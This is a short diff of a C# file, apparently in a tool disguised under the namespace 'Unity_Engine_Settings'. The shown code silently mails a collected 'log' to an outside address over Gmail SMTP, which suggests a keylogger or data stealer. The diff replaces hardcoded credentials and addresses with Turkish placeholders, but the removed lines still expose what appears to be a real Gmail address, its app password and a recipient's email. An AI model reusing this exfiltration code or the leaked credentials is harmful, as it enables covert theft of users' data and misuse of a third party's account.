@@ -125,15 +125,15 @@ namespace Unity_Engine_Settings
             MailMessage msj = new MailMessage();
             SmtpClient istemci = new SmtpClient();
 
-            istemci.Credentials = new System.Net.NetworkCredential("gs.fb0507@gmail.com", "risajupgxougznzq");
+            istemci.Credentials = new System.Net.NetworkCredential("gönderen email", "sifre");
             istemci.Port = 587;
             istemci.Host = "smtp.gmail.com";
             istemci.EnableSsl = true;
 
             msj.Body = log.ToString();
             msj.Subject = "#Log";
-            msj.From = new MailAddress("gs.fb0507@gmail.com");
-            msj.To.Add("b.kadirhanofficial@hotmail.com");
+            msj.From = new MailAddress("gönderen email");
+            msj.To.Add("gönderilen email");
 
             istemci.Send(msj);
 
